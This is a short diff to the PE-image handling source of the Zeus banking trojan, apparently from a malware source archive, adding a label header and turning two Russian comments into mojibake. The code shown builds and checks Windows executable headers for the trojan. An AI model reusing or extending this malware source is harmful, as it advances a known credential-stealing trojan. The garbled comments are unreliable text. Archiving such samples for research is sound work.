@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "peimage.h"
@@ -576,7 +587,7 @@ DWORD PeImage::_buildImage(PEDATA *pedata, DWORD flags, DWORD rvaOfEntryPoint, L
     }
   }
 
-  //Обновляем NT-header.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NT-header.
   ((IMAGE_NT_HEADERS32 * )newNtHeader)->FileHeader.NumberOfSections = pedata->sectionsCount;
   bool setChecksum = (output && (flags & BIF_CHECKSUM)) ? true : false;
 
@@ -1009,7 +1020,7 @@ bool PeImage::_isPeImage(void *mem, DWORD memSize)
   if(dosHeader->e_magic != IMAGE_DOS_SIGNATURE || dosHeader->e_lfanew < sizeof(WORD) || dosHeader->e_lfanew >= memSize - sizeof(IMAGE_NT_HEADERS32))return false;
   offset += dosHeader->e_lfanew;
 
-  //Получаем NT-header.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NT-header.
   //This checks otsnovnye parameters for determining the 32/64 and predotvrasheniya "buffer overflow".
   //Making a tougher test does not see the point.
   if(((IMAGE_NT_HEADERS32 *)offset)->Signature != IMAGE_NT_SIGNATURE)return false;
